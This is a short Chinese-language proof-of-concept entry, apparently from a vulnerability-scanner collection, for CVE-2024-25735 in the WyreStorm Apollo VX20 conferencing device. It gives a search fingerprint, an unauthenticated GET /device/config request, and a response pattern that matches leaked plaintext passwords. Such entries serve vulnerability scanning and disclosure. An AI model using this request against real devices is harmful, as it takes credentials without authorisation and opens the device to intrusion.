﻿# WyreStorm Apollo VX20 信息泄露漏洞

> 更新时间：2024-03-08

> 漏洞编号：CVE-2024-25735

> 漏洞说明：WyreStorm Apollo VX20是一款优质的音视频会议一体机，专为企业办公室和会议室空间设计。这款设备集成了摄像头、麦克风、扬声器及投屏功能，为企业办公和视频会议提供优质的视听体验。该系统存在信息泄露漏洞，未经授权的远程攻击者可以获取明文凭据。

> 漏洞特征：icon_hash="-893957814"

> 验证脚本：HTTP

```
GET /device/config HTTP/1.1
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

> 响应代码特征：200

> 响应内容特征：^(?=.*?password)(?=.*?softAp).*?$

> 上传文件定位：

> 验证文件来源：WyreStorm Apollo VX20 信息泄露漏洞.poc

